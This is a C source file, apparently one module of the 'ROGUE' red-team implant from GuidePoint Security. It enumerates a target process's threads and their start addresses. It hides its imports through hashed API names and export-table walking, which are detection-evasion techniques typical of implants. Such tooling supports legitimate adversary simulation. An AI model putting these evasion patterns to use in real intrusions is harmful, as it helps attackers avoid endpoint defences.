/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtQueryInformationThread );
	D_API( NtGetNextThread );
	D_API( NtOpenProcess );
	D_API( NtClose );
} API ;

typedef struct __attribute__(( packed ))
{
	UINT32	ProcessId;
} ROGUE_TASK_REQ_PROC_THREAD, *PROGUE_TASK_REQ_PROC_THREAD ;

/* API Hashes */
#define H_API_NTQUERYINFORMATIONTHREAD		0xf5a0461b /* NtQueryInformationThread */
#define H_API_NTGETNEXTTHREAD			0xa410fb9e /* NtGetNextThread */
#define H_API_NTOPENPROCESS			0x4b82f718 /* NtOpenProcess */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */

#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Lists information about a process's threads.
 *
!*/
D_SEC( B ) BOOLEAN CtlProcThread( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, _In_ UINT32 Length, _Out_ PBUFFER Output )
{
	API				Api;
	CLIENT_ID			Cid;
	OBJECT_ATTRIBUTES		Att;
	THREAD_BASIC_INFORMATION	Tbi;

	BOOLEAN				Ret = FALSE;
	NTSTATUS			Nst = STATUS_SUCCESS;

	PVOID				Adr = NULL;
	HANDLE				Prc = NULL;
	HANDLE				Thd = NULL;
	HANDLE				Nxt = NULL;
	PBUFFER				Out = NULL;
	PROGUE_TASK_REQ_PROC_THREAD	Rtq = NULL;

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Cid, sizeof( Cid ) );
	RtlZeroMemory( &Att, sizeof( Att ) );
	RtlZeroMemory( &Tbi, sizeof( Tbi ) );

	if ( Length != sizeof( ROGUE_TASK_REQ_PROC_THREAD ) ) {
		/* Notify that we failed */
		NtCurrentTeb()->LastErrorValue = STATUS_INVALID_PARAMETER;

		/* Alert of failure! */
		return FALSE;
	};

	Api.NtQueryInformationThread = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTQUERYINFORMATIONTHREAD ) );
	Api.NtGetNextThread          = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTGETNEXTTHREAD ) );
	Api.NtOpenProcess            = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTOPENPROCESS ) );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTCLOSE ) );

	Rtq = C_PTR( Buffer );
	Cid.UniqueProcess = C_PTR( Rtq->ProcessId );
	InitializeObjectAttributes( &Att, NULL, 0, NULL, NULL );

	/* Open the process */
	if ( NT_SUCCESS( ( Nst = Api.NtOpenProcess( &Prc, PROCESS_QUERY_INFORMATION, &Att, &Cid ) ) ) ) {
		/* Create the output buffer */
		if ( ( Out = BufferCreate() ) != NULL ) {
			/* Open each thread we can */
			while ( NT_SUCCESS( Api.NtGetNextThread( Prc, Thd, THREAD_QUERY_INFORMATION, 0, 0, &Nxt ) ) ) {
				/* Did the thread already exists */
				if ( Thd != NULL ) {
					Api.NtClose( Thd );
				};
				/* Move onto the next one */
				Thd = C_PTR( Nxt );

				/* Query the start address pointer */
				if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadQuerySetWin32StartAddress, &Adr, sizeof( Adr ), NULL ) ) ) {
					if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL ) ) ) {
						if ( Tbi.ExitStatus == STATUS_PENDING ) {
							BufferPrintf( Out, C_PTR( G_PTR( "%hu\t0x%p\n" ) ), Tbi.ClientId.UniqueThread, Adr );
						};
					};
				};
			};
			if ( Thd != NULL ) {
				Api.NtClose( Thd );
			};

			/* Add the output buffer */
			Ret = BufferAddRaw( Output, Out->Buffer, Out->Length );

			/* Clear the output buffer */
			BufferClear( Out );
		};
		/* Close the process */
		Api.NtClose( Prc );
	};

	if ( ! NT_SUCCESS( Nst ) ) {
		NtCurrentTeb()->LastErrorValue = Nst;
	};

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Cid, sizeof( Cid ) );
	RtlZeroMemory( &Att, sizeof( Att ) );
	RtlZeroMemory( &Tbi, sizeof( Tbi ) );

	return Ret;
};
